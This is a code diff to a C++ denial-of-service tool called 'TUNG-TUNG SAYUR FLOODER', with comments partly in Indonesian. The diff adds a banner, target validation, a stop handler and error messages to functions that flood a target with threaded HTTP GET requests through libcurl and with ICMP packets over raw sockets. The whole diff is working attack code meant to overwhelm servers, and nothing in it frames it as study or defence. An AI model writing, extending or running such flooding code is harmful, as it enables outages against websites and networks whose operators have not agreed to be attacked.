@@ -22,7 +22,30 @@
 std::atomic<bool> running(true);
 std::atomic<long long> total_sent(0);
 
-// Helper function to send HTTP GET requests (Layer 7)
+// Signal handler untuk menghentikan flood
+void stop(int) {
+    running = false;
+}
+
+// Helper function untuk mencetak banner
+void print_banner() {
+    std::cout << "=====================================\n";
+    std::cout << "        TUNG-TUNG SAYUR FLOODER      \n";
+    std::cout << "=====================================\n";
+}
+
+// Helper function untuk memeriksa apakah target adalah IP atau URL
+bool validate_target(const std::string& target, int layer) {
+    if (layer == 3) {
+        sockaddr_in sa;
+        return inet_pton(AF_INET, target.c_str(), &(sa.sin_addr)) != 0;
+    } else if (layer == 7) {
+        return target.find("http://") == 0 || target.find("https://") == 0;
+    }
+    return false;
+}
+
+// Helper function untuk mengirim HTTP GET requests (Layer 7)
 void http_flood(const std::string& url, int duration) {
     CURL* curl;
     CURLcode res;
@@ -41,6 +64,8 @@ void http_flood(const std::string& url, int duration) {
             res = curl_easy_perform(curl);
             if (res == CURLE_OK) {
                 ++total_sent;
+            } else {
+                std::cerr << "[!] HTTP Flood error: " << curl_easy_strerror(res) << "\n";
             }
         }
         curl_easy_cleanup(curl);
@@ -48,10 +73,13 @@ void http_flood(const std::string& url, int duration) {
     curl_global_cleanup();
 }
 
-// Helper function to send ICMP requests (Layer 3)
+// Helper function untuk mengirim ICMP requests (Layer 3)
 void icmp_flood(const std::string& ip, int duration) {
     int sock = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP);
-    if (sock < 0) return;
+    if (sock < 0) {
+        std::cerr << "[X] Failed to create raw socket. Run as root.\n";
+        return;
+    }
 
     sockaddr_in target{};
     target.sin_family = AF_INET;
@@ -70,7 +98,7 @@ void icmp_flood(const std::string& ip, int duration) {
     close(sock);
 }
 
-// Flood dispatcher based on Layer type
+// Flood dispatcher berdasarkan Layer type
 void start_flood_layer(const std::string& target, int duration, int threads, int layer) {
     std::vector<std::thread> workers;
     if (layer == 3) {
@@ -87,9 +115,14 @@ void start_flood_layer(const std::string& target, int duration, int threads, int
     }
 }
 
-// Main entry point for Layer 3-7 Floods
+// Main entry point untuk Layer 3-7 Floods
 void start_flood(const std::string& target, int port, int duration, int threads, int layer) {
     print_banner();
+    if (!validate_target(target, layer)) {
+        std::cerr << "[X] Invalid target. Use a valid IP for Layer 3 or a valid URL for Layer 7.\n";
+        return;
+    }
+
     std::cout << "\n[!] Validation: stx OK\n";
     std::cout << "[*] Flood Target  : " << target << " | Threads: " << threads << "\n\n";
 
